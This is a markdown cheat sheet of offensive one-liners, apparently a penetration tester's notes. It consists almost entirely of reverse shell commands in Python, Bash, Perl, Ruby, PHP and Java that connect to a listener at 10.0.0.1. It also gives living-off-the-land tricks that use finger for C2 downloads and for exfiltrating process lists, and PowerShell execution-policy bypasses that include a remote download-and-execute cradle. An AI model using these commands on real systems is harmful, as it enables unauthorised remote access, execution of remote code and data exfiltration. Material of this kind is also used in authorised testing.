# (Web| Reverse)* Shell

## Reverse Shells

- Python: 
```python
python -c 'import pty; pty.spawn("/bin/sh")'

python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

- Bash:
```bash
echo os.system('/bin/bash')

/bin/sh -i

bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
```

- Perl:
```perl
perl —e 'exec "/bin/sh";'

perl -e exec "/bin/sh";

perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

- Ruby:

```ruby
exec "/bin/sh"

ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

- Lua:

```lua
os.execute('/bin/sh')
```

- PHP:
 
```php
php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
```

- Java:

```java
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```

- Others:

```bash
#(From within IRB)
exec "/bin/sh"

#(From within vi)
:!bash

#(From within vi)
:set shell=/bin/bash:shell

#(From within nmap)
!sh
```


## LOL

### Windows

-  Finger:
```
# Download files:
C:\> finger <C2-Command>@HOST > Malwr.txt

# Exfil running processes:
C:\> for /f "tokens=1" %i in ('tasklist') do finger %i@192.168.1.21

```

- Certutil:

#### Powershell

- Ways to [Bypass](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/) the PowerShell Execution Policy:
```Powershell
PS C:\> Echo Write-Host "My voice is my passport, verify me." | PowerShell.exe -noprofile -
PS C:\> Get-Content .runme.ps1 | PowerShell.exe -noprofile -
PS C:\> TYPE .runme.ps1 | PowerShell.exe -noprofile -
PS C:\> powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://domain/script.ps1')"
PS C:\> Powershell -c "Write-Host 'My voice is my passport, verify me.'"
PS C:\> $command = "Write-Host 'My voice is my passport, verify me.'" $bytes = [System.Text.Encoding]::Unicode.GetBytes($command) $encodedCommand = [Convert]::ToBase64String($bytes) powershell.exe -EncodedCommand $encodedCommand
PS C:\> powershell.exe -Enc VwByAGkAdABlAC0ASABvAHMAdAAgACcATQB5ACAAdgBvAGkAYwBlACAAaQBzACAAbQB5ACAAcABhAHMAcwBwAG8AcgB0ACwAIAB2AGUAcgBpAGYAeQAgAG0AZQAuACcA
PS C:\> invoke-command -scriptblock {Write-Host "My voice is my passport, verify me."}
PS C:\> invoke-command -computername Server01 -scriptblock {get-executionpolicy} | set-executionpolicy -force
PS C:\> Get-Content .runme.ps1 | Invoke-Expression
PS C:\> GC .runme.ps1 | iex
PS C:\> PowerShell.exe -ExecutionPolicy Bypass -File .runme.ps1
PS C:\> PowerShell.exe -ExecutionPolicy UnRestricted -File .runme.ps1
PS C:\> PowerShell.exe -ExecutionPolicy Remote-signed -File .runme.ps1
PS C:\> function Disable-ExecutionPolicy {($ctx = $executioncontext.gettype().getfield("_context","nonpublic,instance").getvalue( $executioncontext)).gettype().getfield("_authorizationManager","nonpublic,instance").setvalue($ctx, (new-object System.Management.Automation.AuthorizationManager "Microsoft.PowerShell"))}  Disable-ExecutionPolicy  .runme.ps1
PS C:\> Set-ExecutionPolicy Bypass -Scope Process
PS C:\> Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted
PS C:\> HKEY_CURRENT_USER\Software\MicrosoftPowerShell\1\ShellIds\Microsoft.PowerShell
PS C:\>
PS C:\>
```